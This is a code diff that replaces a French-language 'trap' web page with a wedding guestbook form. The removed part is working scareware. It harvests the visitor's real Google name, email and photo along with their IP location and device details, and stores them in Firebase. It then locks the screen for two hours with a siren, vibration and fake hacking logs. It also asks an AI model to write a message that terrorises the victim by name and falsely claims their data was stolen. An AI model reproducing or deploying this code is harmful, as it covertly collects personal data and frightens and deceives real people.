-        const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';
-        
-        // Stockage des vraies données Google
-        let personalData = { nom: "", email: "", photo: "" };
+      {/* Formulaire */}
+      <form onSubmit={handleSubmit} className="glass-panel p-6 rounded-3xl shadow-xl mb-10 animate-slide-up delay-100 transition-all focus-within:shadow-rose-500/10 focus-within:border-rose-300">
+        <div className="mb-4">
+          <input 
+            type="text" 
+            placeholder="Votre Prénom" 
+            value={newName}
+            onChange={(e) => setNewName(e.target.value)}
+            className="w-full p-4 bg-white/80 border border-transparent rounded-xl focus:outline-none focus:ring-2 focus:ring-rose-400 focus:bg-white shadow-inner transition-all"
+            required
+          />
+        </div>
+        <div className="mb-4">
+          <textarea 
+            placeholder="Laissez un petit mot aux mariés..." 
+            value={newMsg}
+            onChange={(e) => setNewMsg(e.target.value)}
+            rows="3"
+            className="w-full p-4 bg-white/80 border border-transparent rounded-xl focus:outline-none focus:ring-2 focus:ring-rose-400 focus:bg-white shadow-inner transition-all resize-none"
+            required
+          ></textarea>
+        </div>
+        <button 
+          type="submit"
+          className="w-full animate-shimmer-bg text-white font-bold py-4 px-6 rounded-xl shadow-md hover:shadow-lg hover:shadow-rose-500/20 active:scale-[0.98] transition-all flex items-center justify-center gap-2 group"
+        >
+          Envoyer mon mot <Send size={18} className="group-hover:translate-x-2 group-hover:-translate-y-1 transition-transform" />
+        </button>
+      </form>
 
-        async function generateThreatAnalysis(userData) {
-            const prompt = `Agis comme une IA de sécurité offensive malveillante et impitoyable. Tu viens de pirater le compte Google officiel d'un humain nommé "${personalData.nom}" (Email: ${personalData.email}). Métadonnées : 
-Appareil: ${userData.os}, Navigateur: ${userData.navigateur}, Batterie: ${userData.batterie}, Localisation approximative: ${userData.ville}, ${userData.pays}.
-Écris un rapport très intimidant, cynique et sombre (maximum 3 phrases). Appelle-le par son vrai nom pour le terroriser. Moque-toi cruellement de sa naïveté d'avoir donné accès à son compte Google via un bouton douteux. Mentionne expressément que tu as profité des 2 heures entières pendant lesquelles l'alarme a sonné pour télécharger tous ses e-mails, ses photos et usurper son identité numérique en arrière-plan. Ne sois pas trop formel, sois ultra flippant et convaincant.`;
-            
-            const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=${apiKey}`;
-            const payload = { contents: [{ parts: [{ text: prompt }] }] };
-            
-            const delays = [1000, 2000, 4000, 8000, 16000];
-            for (let i = 0; i < 5; i++) {
-                try {
-                    const response = await fetch(url, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload)
-                    });
-                    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-                    const result = await response.json();
-                    return result.candidates?.[0]?.content?.parts?.[0]?.text || "Erreur système IA.";
-                } catch (error) {
-                    if (i === 4) return "Échec de connexion au noyau IA. La cible a de la chance pour aujourd'hui.";
-                    await new Promise(res => setTimeout(res, delays[i]));
-                }
-            }
-        }
-
-        // ==========================================
-        // GESTION DU FAUX BLOCAGE (CLICS)
-        // ==========================================
-        const panicScreen = document.getElementById('step-panic');
-        panicScreen.addEventListener('pointerdown', (e) => {
-            e.preventDefault(); 
-            if(navigator.vibrate) navigator.vibrate(50);
-            
-            const denied = document.createElement('div');
-            denied.textContent = "ACCÈS REFUSÉ";
-            denied.className = "absolute text-red-500 font-black text-xs md:text-sm font-mono z-[100] pointer-events-none drop-shadow-[0_0_8px_rgba(255,0,0,1)]";
-            denied.style.left = (e.clientX - 40) + 'px';
-            denied.style.top = (e.clientY - 10) + 'px';
-            document.body.appendChild(denied);
-            setTimeout(() => denied.remove(), 600);
-        });
-
-        // ==========================================
-        // ANIMATION DU TERMINAL DE PIRATAGE
-        // ==========================================
-        const terminalLines = [
-            "<span class='text-red-500'>[!] CONNEXION OAUTH DÉTOURNÉE AVEC SUCCÈS</span>",
-            "[*] INITIATION DU PROTOCOLE DE VERROUILLAGE...",
-            "<span class='text-red-500'>[!] INTERCEPTION DU COMPTE GOOGLE... ACTIF</span>",
-            "[*] ASPIRATION DES EMAILS ET CONTACTS...",
-            "[*] EXTRACTION DE L'ADRESSE IP...",
-            "[*] SYNCHRONISATION DES PHOTOS GOOGLE DRIVE...",
-            "<span class='text-white'>[#] CONNEXION AU SERVEUR DISTANT ÉTABLIE</span>",
-            "[*] TÉLÉVERSEMENT MASSIF EN COURS..."
-        ];
-
-        function runTerminal() {
-            const terminal = document.getElementById('terminal-content');
-            let i = 0;
-            const interval = setInterval(() => {
-                if (i < terminalLines.length) {
-                    const line = document.createElement('div');
-                    line.innerHTML = terminalLines[i];
-                    terminal.appendChild(line);
-                    i++;
-                } else {
-                    const randomLine = document.createElement('div');
-                    randomLine.textContent = `> UPLOAD DATA 0x${Math.floor(Math.random()*999999).toString(16).toUpperCase()} ... OK`;
-                    terminal.appendChild(randomLine);
-                    if (terminal.childElementCount > 6) terminal.firstChild.remove();
-                }
-            }, 800);
-        }
-
-        // ==========================================
-        // EFFET CODE MATRIX
-        // ==========================================
-        let matrixInterval;
-        function startMatrixEffect() {
-            const canvas = document.getElementById('matrix-canvas');
-            const ctx = canvas.getContext('2d');
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-            const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()_+-=<>?/:;';
-            const fontSize = 14;
-            const columns = canvas.width / fontSize;
-            const drops = [];
-            for(let x = 0; x < columns; x++) drops[x] = 1;
-            
-            function drawMatrix() {
-                ctx.fillStyle = 'rgba(0, 0, 0, 0.1)';
-                ctx.fillRect(0, 0, canvas.width, canvas.height);
-                ctx.fillStyle = '#0f0';
-                ctx.font = fontSize + 'px monospace';
-                for(let i = 0; i < drops.length; i++) {
-                    const text = letters.charAt(Math.floor(Math.random() * letters.length));
-                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-                    if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-                    drops[i]++;
-                }
-            }
-            matrixInterval = setInterval(drawMatrix, 33);
-        }
-        function stopMatrixEffect() { clearInterval(matrixInterval); }
-
-        // ==========================================
-        // SYSTÈME AUDIO
-        // ==========================================
-        let audioCtx, masterGain;
-        let isAudioInit = false;
-
-        function initScarySiren() {
-            if (isAudioInit) return;
-            try {
-                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                masterGain = audioCtx.createGain();
-                const osc1 = audioCtx.createOscillator(); 
-                const osc2 = audioCtx.createOscillator(); 
-                const osc3 = audioCtx.createOscillator(); 
-                const lfoStutter = audioCtx.createOscillator(); 
-                const lfoSweep = audioCtx.createOscillator(); 
-
-                osc1.type = 'square'; osc2.type = 'sawtooth'; osc3.type = 'square'; 
-                lfoStutter.type = 'square'; lfoSweep.type = 'sine';
-
-                osc1.frequency.value = 1200; osc2.frequency.value = 1250; osc3.frequency.value = 55; 
-
-                lfoStutter.frequency.value = 15;
-                const stutterGain = audioCtx.createGain(); stutterGain.gain.value = 600;
-                lfoStutter.connect(stutterGain); stutterGain.connect(osc1.frequency); stutterGain.connect(osc2.frequency);
-
-                lfoSweep.frequency.value = 0.5;
-                const sweepGain = audioCtx.createGain(); sweepGain.gain.value = 800;
-                lfoSweep.connect(sweepGain); sweepGain.connect(osc1.frequency); sweepGain.connect(osc2.frequency);
-
-                osc1.connect(masterGain); osc2.connect(masterGain);
-                
-                const bassGain = audioCtx.createGain(); bassGain.gain.value = 1.5;
-                osc3.connect(bassGain); bassGain.connect(masterGain);
-
-                masterGain.connect(audioCtx.destination); masterGain.gain.value = 0; 
-
-                osc1.start(); osc2.start(); osc3.start(); lfoStutter.start(); lfoSweep.start();
-                isAudioInit = true;
-            } catch(e) { console.log("Audio non supporté"); }
-        }
-
-        function playSiren() {
-            if (!isAudioInit) initScarySiren();
-            if (masterGain && audioCtx) masterGain.gain.setTargetAtTime(0.2, audioCtx.currentTime, 0.05);
-        }
-        function pauseSiren() {
-            if (masterGain && audioCtx) masterGain.gain.setTargetAtTime(0, audioCtx.currentTime, 0.05);
-        }
-
-        // ==========================================
-        // VIBRATION
-        // ==========================================
-        let vibeInterval;
-        function playVibration() {
-            if (navigator.vibrate) {
-                navigator.vibrate([400, 100, 400, 100, 800, 200]);
-                vibeInterval = setInterval(() => { navigator.vibrate([400, 100, 400, 100, 800, 200]); }, 2000);
-            }
-        }
-        function pauseVibration() {
-            clearInterval(vibeInterval);
-            if (navigator.vibrate) navigator.vibrate(0); 
-        }
-
-        function getDetailedDeviceInfo() {
-            const ua = navigator.userAgent;
-            let name = "PC Bureau"; let browser = "Navigateur Inconnu";
-            if (ua.includes("Firefox")) browser = "Firefox";
-            else if (ua.includes("SamsungBrowser")) browser = "Samsung Internet";
-            else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";
-            else if (ua.includes("Edge") || ua.includes("Edg")) browser = "Edge";
-            else if (ua.includes("Chrome")) browser = "Chrome";
-            else if (ua.includes("Safari")) browser = "Safari";
-
-            if (/iPhone|iPad|iPod/i.test(ua)) { name = "Apple iPhone"; }
-            else if (/Android/i.test(ua)) {
-                if (/Samsung|SM-|GT-/i.test(ua)) name = "Samsung Galaxy";
-                else if (/Huawei|Honor/i.test(ua)) name = "Huawei Device";
-                else if (/Pixel/i.test(ua)) name = "Google Pixel";
-                else name = "Appareil Android";
-            }
-            else if (/Mac/i.test(ua)) { name = "Apple Mac"; }
-            return { name, browser };
-        }
-
-        async function processClick() {
-            let geoData = {}; let batteryLevel = "100";
-            const dateStr = new Date().toLocaleDateString('fr-FR', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
-            const sessionId = 'CRIT-' + Math.random().toString(36).substr(2, 6).toUpperCase();
-            const cores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Cœurs" : "Inconnu";
-            const ram = navigator.deviceMemory ? navigator.deviceMemory + " Go RAM" : "Inconnue";
-            const connType = navigator.connection ? navigator.connection.effectiveType.toUpperCase() : "WIFI/LAN";
-
-            try {
-                const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
-                geoData = await response.json();
-                if ('getBattery' in navigator) {
-                    const b = await navigator.getBattery();
-                    batteryLevel = Math.round(b.level * 100);
-                }
-            } catch (e) { batteryLevel = "100"; }
-            
-            const dev = getDetailedDeviceInfo();
-
-            const data = { session_id: sessionId, nom: personalData.nom, email: personalData.email, photo_url: personalData.photo, ip: geoData.ip || "N/A", ville: geoData.city || "Inconnue", pays: geoData.country || "Inconnu", isp: geoData.organization || "Inconnu", batterie: batteryLevel + "%", os: dev.name, navigateur: dev.browser, cpu: cores, ram: ram, reseau: connType, date_clic: serverTimestamp() };
-            try { 
-                const user = auth.currentUser;
-                if (user) {
-                    // Sauvegarde dans le chemin strict et autorisé par Firebase
-                    await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'visites_mysteres'), data); 
-                }
-            } catch(e) {
-                console.error("Erreur de sauvegarde dans la base de données :", e);
-            }
-            return { ...geoData, batteryLevel, dev, dateStr, sessionId, cores, ram, connType };
-        }
-
-        // ==========================================
-        // LOGIQUE DES ÉCRANS ET DE L'AUTHENTIFICATION
-        // ==========================================
-
-        // Fonction qui lance l'horreur
-        async function launchPanicSequence() {
-            // Fondu au noir de l'écran d'authentification
-            document.getElementById('step-auth').style.opacity = '0';
-            setTimeout(() => {
-                document.getElementById('step-auth').classList.add('hidden');
-                document.getElementById('step-auth').classList.remove('flex');
-                document.getElementById('step-loading').classList.remove('hidden');
-            }, 500);
-
-            const dataPromise = processClick();
-            
-            await new Promise(r => setTimeout(r, 3000)); // Suspense de 3s
-            
-            document.getElementById('step-loading').classList.add('hidden');
-            
-            const panicScreen = document.getElementById('step-panic');
-            panicScreen.classList.remove('hidden');
-            panicScreen.classList.add('flex');
-            
-            startMatrixEffect(); 
-            playSiren();
-            playVibration();
-            runTerminal(); 
-
-            // Temps total (7205000 = 2 heures et 5 secondes)
-            const tempsTotalMs = 7205000; 
-
-            setTimeout(async () => {
-                panicScreen.classList.add('hidden');
-                panicScreen.classList.remove('flex');
-                stopMatrixEffect(); pauseSiren(); pauseVibration();
-
-                const data = await dataPromise;
-                
-                // Affichage des vraies données Google
-                document.getElementById('display-user-nom').textContent = personalData.nom;
-                document.getElementById('display-user-email').textContent = personalData.email;
-                
-                if (personalData.photo) {
-                    const imgEl = document.getElementById('display-user-photo');
-                    imgEl.src = personalData.photo;
-                    imgEl.classList.remove('hidden');
-                }
-
-                document.getElementById('display-date').textContent = data.dateStr;
-                document.getElementById('display-name').textContent = data.sessionId;
-                document.getElementById('display-ip').textContent = data.ip || "127.0.0.1";
-                document.getElementById('display-isp').textContent = data.organization || "Inconnu";
-                document.getElementById('display-conn').textContent = data.connType;
-                document.getElementById('display-cpu').textContent = data.cores;
-                document.getElementById('display-ram').textContent = data.ram;
-                document.getElementById('display-battery').textContent = data.batteryLevel + "%";
-                document.getElementById('battery-icon-container').innerHTML = `<svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="7" width="16" height="10" rx="2" /><path d="M21 10v4" /><rect x="4" y="9" width="${Math.max(1, (parseInt(data.batteryLevel)/100)*12)}" height="6" fill="currentColor" stroke="none" /></svg>`;
-                document.getElementById('display-cpu').textContent = data.dev.name;
-                document.getElementById('display-browser').textContent = data.dev.browser;
-                
-                const locText = (data.city ? data.city + ", " : "") + (data.country || "Inconnu");
-                document.getElementById('display-location').textContent = locText;
-                
-                if (data.country_code) { 
-                    document.getElementById('display-flag').src = `https://flagcdn.com/w40/${data.country_code.toLowerCase()}.png`; 
-                    document.getElementById('display-flag').classList.remove('hidden'); 
-                }
-                
-                const step2 = document.getElementById('step-2');
-                step2.classList.remove('hidden');
-                step2.classList.add('flex');
-
-                // Lancement de l'Analyse IA
-                const btnIA = document.getElementById('btn-ia-analysis');
-                const loadingIA = document.getElementById('ia-loading');
-                const reportContainerIA = document.getElementById('ia-report-container');
-                const reportTextIA = document.getElementById('ia-report-text');
-
-                btnIA.addEventListener('click', async () => {
-                    btnIA.classList.add('hidden');
-                    loadingIA.classList.remove('hidden'); loadingIA.classList.add('flex');
-                    
-                    const report = await generateThreatAnalysis(data);
-                    
-                    loadingIA.classList.add('hidden'); loadingIA.classList.remove('flex');
-                    reportContainerIA.classList.remove('hidden');
-                    
-                    reportTextIA.textContent = '';
-                    let i = 0;
-                    const typeWriter = setInterval(() => {
-                        if (i < report.length) {
-                            reportTextIA.textContent += report.charAt(i); i++;
-                        } else {
-                            clearInterval(typeWriter);
-                        }
-                    }, 30);
-                });
-
-            }, tempsTotalMs);
-        }
-
-        // Clic sur le vrai bouton Google
-        document.getElementById('google-auth-btn').addEventListener('click', async () => {
-            // DÉBLOCAGE AUDIO ET VIBRATION : Micro-vibration et init audio immédiats au clic
-            if (navigator.vibrate) navigator.vibrate(10);
-            initScarySiren();
-
-            const errorBox = document.getElementById('auth-error');
-            errorBox.classList.add('hidden');
-            
-            try {
-                // Tente la VRAIE connexion via le popup Google
-                const result = await signInWithPopup(auth, googleProvider);
-                const user = result.user;
-                
-                // Extraction magique des vraies informations !
-                personalData.nom = user.displayName || "Cible Inconnue";
-                personalData.email = user.email || "Email Inconnu";
-                personalData.photo = user.photoURL || "";
-                
-                // Si la connexion réussit, on lance le piège
-                launchPanicSequence();
-
-            } catch (error) {
-                console.error("Erreur d'authentification (Popup bloqué ou annulé) :", error);
-                
-                // Si ça échoue (popup bloqué par l'Aperçu, annulation...), on utilise l'authentification anonyme 
-                // pour que le piège fonctionne quand même, mais on l'indique explicitement dans la base de données.
-                try {
-                    await signInAnonymously(auth);
-                    personalData.nom = "Échec (Test en Aperçu ou Popup Bloqué)";
-                    personalData.email = "Anonyme";
-                    launchPanicSequence();
-                } catch(e) {
-                    errorBox.textContent = "Erreur système critique. Connexion impossible.";
-                    errorBox.classList.remove('hidden');
-                }
-            }
-        });
-
-    </script>
-</body>
-</html>
+      {/* Liste des messages */}
+      <div className="space-y-4">
+        {messages.map((msg, idx) => (
+          <div 
+            key={idx} 
+            className="bg-white/70 backdrop-blur-md p-5 rounded-2xl shadow-sm border border-white flex gap-4 items-start animate-slide-up hover:shadow-md transition-shadow"
+            style={{ animationDelay: `${idx * 150 + 200}ms` }}
+          >
+            <div className="w-12 h-12 rounded-full bg-gradient-to-br from-rose-300 to-purple-300 flex items-center justify-center text-white font-bold flex-shrink-0 shadow-inner">
+              {msg.name.charAt(0).toUpperCase()}
+            </div>
+            <div className="flex-1">
+              <div className="flex items-baseline justify-between mb-1">
+                <h4 className="font-bold text-slate-800 text-lg">{msg.name}</h4>
+                <span className="text-xs text-slate-400 font-medium bg-white/50 px-2 py-1 rounded-full">{msg.date}</span>
+              </div>
+              <p className="text-slate-600 leading-relaxed">{msg.text}</p>
+            </div>
+          </div>
+        ))}
+      </div>
+    </div>
+  );
+};
